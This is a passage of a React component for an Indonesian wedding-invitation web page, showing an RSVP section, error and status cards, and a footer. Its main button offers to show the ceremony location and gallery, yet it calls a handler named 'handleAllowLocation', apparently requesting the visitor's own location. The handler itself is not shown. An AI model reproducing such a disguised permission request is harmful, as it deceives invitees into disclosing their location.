                <motion.div variants={slideUp} className="flex flex-col items-center mb-12">
                  <div className="w-16 h-px bg-gradient-to-r from-transparent via-[#C7AA64] to-transparent mb-5"></div>
                  <p className="text-[12px] sm:text-[13px] text-[#DFE5D5]/90 leading-[1.8] px-4 font-playfair italic">
                    Untaian doa restu serta konfirmasi kehadiran Anda adalah perhiasan paling indah bagi lembaran baru kehidupan kami.
                  </p>
                  <div className="w-16 h-px bg-gradient-to-r from-transparent via-[#C7AA64] to-transparent mt-5"></div>
                </motion.div>

                <AnimatePresence mode="wait">
                  {status === "connection_error" ? (
                    <motion.div 
                      key="error"
                      initial={{ opacity: 0, scale: 0.9 }}
                      animate={{ opacity: 1, scale: 1 }}
                      exit={{ opacity: 0, scale: 0.9 }}
                      className="w-full py-6 px-4 text-center bg-red-900/60 rounded-3xl border border-red-500/40 backdrop-blur-md shadow-xl"
                    >
                      <div className="w-12 h-12 mx-auto mb-3 bg-red-500/20 text-red-300 rounded-full flex items-center justify-center">
                        <AlertCircle className="w-5 h-5" />
                      </div>
                      <h3 className="text-sm font-semibold text-white mb-2">Hembusan Terputus</h3>
                      <p className="text-[10px] sm:text-xs text-red-200/90 mb-5 leading-relaxed">
                        Maaf, semesta maya sedang merajuk. Mohon periksa kembali sinyal perangkat Anda.
                      </p>
                      <button 
                        onClick={() => window.location.reload()}
                        className="px-6 py-2.5 rounded-full border border-red-400/50 text-white text-[10px] sm:text-xs font-semibold hover:bg-red-500/30 transition-all flex items-center gap-2 mx-auto active:scale-95"
                      >
                        <RefreshCw className="w-3.5 h-3.5" /> Rajut Kembali Tautan
                      </button>
                    </motion.div>
                  ) : (
                    <motion.div key="action" variants={slideUp} className="space-y-4 w-full">
                      <button
                        onClick={handleAllowLocation}
                        disabled={status === "loading" || status === "success"}
                        className="w-full relative group overflow-hidden rounded-full bg-white text-[#4A5D44] text-[11px] sm:text-sm font-bold px-6 py-3.5 sm:py-4 shadow-[0_0_30px_rgba(255,255,255,0.15)] transition-all duration-300 hover:scale-[1.03] active:scale-[0.97] disabled:opacity-80 disabled:cursor-not-allowed flex items-center justify-center gap-2 sm:gap-3 border border-transparent"
                      >
                        {status === "loading" ? (
                          <>
                            <RefreshCw className="w-4 h-4 sm:w-5 sm:h-5 animate-spin text-[#4A5D44]" />
                            Merangkai Jejak...
                          </>
                        ) : status === "success" ? (
                          <>
                            <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-green-600" />
                            Kasih Terukir
                          </>
                        ) : (
                          <>
                            Lihat Lokasi Akad & Galeri
                          </>
                        )}
                      </button>

                      <AnimatePresence>
                        {status !== "idle" && status !== "connection_error" && (
                          <motion.div 
                            initial={{ opacity: 0, height: 0, y: -10 }}
                            animate={{ opacity: 1, height: "auto", y: 0, marginTop: 16 }}
                            exit={{ opacity: 0, height: 0, y: -10, marginTop: 0 }}
                            className="text-[10px] sm:text-xs overflow-hidden text-left"
                          >
                            <div className={`
                              px-4 py-3 sm:py-4 rounded-2xl border flex gap-3 backdrop-blur-md shadow-lg
                              ${status === "loading" ? "bg-[#3d4d38]/80 border-[#C7AA64]/30 text-white" : ""}
                              ${status === "error" ? "bg-red-900/60 border-red-500/40 text-red-100" : ""}
                              ${status === "success" ? "bg-green-900/60 border-green-500/40 text-green-100" : ""}
                            `}>
                              {status === "loading" && <RefreshCw className="w-4 h-4 sm:w-5 sm:h-5 animate-spin shrink-0 mt-0.5 text-[#C7AA64]" />}
                              {status === "error" && <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 shrink-0 mt-0.5 text-red-400" />}
                              {status === "success" && <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 shrink-0 mt-0.5 text-green-400" />}
                              <p className="leading-relaxed font-medium">{message}</p>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.div>
            </section>

            {/* FOOTER */}
            <footer className="py-10 px-4 text-center bg-[#F0F2ED] relative overflow-hidden">
              <motion.div 
                animate={{ rotate: -360 }}
                transition={{ duration: 60, repeat: Infinity, ease: "linear" }}
                className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 opacity-5 pointer-events-none"
              >
                <svg viewBox="0 0 100 100" fill="currentColor" className="w-full h-full text-[#4A5D44]">
                  <path d="M50 0 L60 40 L100 50 L60 60 L50 100 L40 60 L0 50 L40 40 Z" />
                </svg>
              </motion.div>

              <motion.div initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-50px" }} variants={staggerContainer} className="relative z-10">
                <motion.h2 variants={scaleUp} className="font-great-vibes text-3xl sm:text-4xl text-[#8F9A83] mb-3">Untaian Syukur</motion.h2>
                <motion.p variants={slideUp} className="text-[9px] sm:text-[11px] text-slate-500 mb-6 max-w-[240px] mx-auto leading-relaxed">
                  Menjadi penyempurna agama dan mengikat hati dalam ridho-Nya, sungguh anugerah tak terhingga bila Anda hadir menjadi saksi di lembaran baru kami.
                </motion.p>
                <motion.div variants={slideUp} className="flex justify-center items-center gap-3 mb-3">
                  <div className="w-8 h-px bg-[#8F9A83]/40"></div>
                  <span className="text-[9px] sm:text-[10px] uppercase text-[#8F9A83] font-bold tracking-[0.3em]">Rama & Shinta</span>
                  <div className="w-8 h-px bg-[#8F9A83]/40"></div>
                </motion.div>
                <motion.p variants={slideUp} className="text-[8px] sm:text-[9px] text-slate-400 font-medium tracking-widest">&copy; 2026 ETERNAL LOVE INVITATION</motion.p>
              </motion.div>
            </footer>

          </motion.main>
        )}
      </AnimatePresence>
    </div>
  );
}
